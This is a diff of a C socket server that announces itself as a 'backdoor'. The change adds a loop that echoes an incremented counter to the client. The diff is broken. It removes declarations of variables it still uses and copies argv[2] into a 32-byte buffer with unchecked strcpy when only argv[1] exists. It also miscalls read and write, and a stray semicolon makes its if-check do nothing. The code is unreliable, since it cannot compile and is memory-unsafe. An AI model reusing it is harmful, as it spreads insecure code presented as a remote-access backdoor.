@@ -27,6 +27,7 @@ int main(int argc, char *argv[])
     //character buffers
     char hash_message[128];
     char plan_message[128];
+    char ack[1024];
     char iv[128];
     char key[32];
 
@@ -35,25 +36,16 @@ int main(int argc, char *argv[])
     int sockfd, newsockfd, portno;      
     socklen_t clilen;    
     
-    //run time loop check 
-    int n, badCommandLength, badCommandLengthMinus, newStringLength;
-    int offStatus = 1, runEnd = 1;
-    int i_counter;
-
-    //random compliment giver
-    int RNselected;
-    
-    //directory changes
-    DIR *d;
-    struct dirent *directory;
 
     //File IO
     FILE *file;
     size_t readsize;
 
-    if (argc < 2) {
+    if (argc != 2) {
         fprintf(stderr,"ERROR, no port provided\n");
         exit(1);
+    }else{
+        strcpy(key, argv[2]);
     }
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) 
@@ -68,17 +60,23 @@ int main(int argc, char *argv[])
             error("ERROR on binding");
     listen(sockfd,5);
     clilen = sizeof(cli_addr);
-    newsockfd = accept(sockfd, 
-            (struct sockaddr *) &cli_addr, 
-            &clilen);
-    if (newsockfd < 0) 
+    newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
+    if (newsockfd < 0) {
         error("ERROR on accept");
-    
-    
-
+    }
     n = write(newsockfd, "Welcome to this backdoor\n", 26);
+    int acks;
     do {
- 
+        bzero(ack, sizeof(ack));
+        n = read(sockfd,ack, 1024, 0);
+        printf("recive: %s\n", ack);
+        if(n > 0);{
+            acks = atoi(ack);
+            acks++;
+            bzero(ack, sizeof(ack));
+            sprintf(ack, "%d", acks);
+            write(sockfd, acks,sizeof(acks));
+        }
     }while (offStatus == 1);
     
     close(newsockfd);
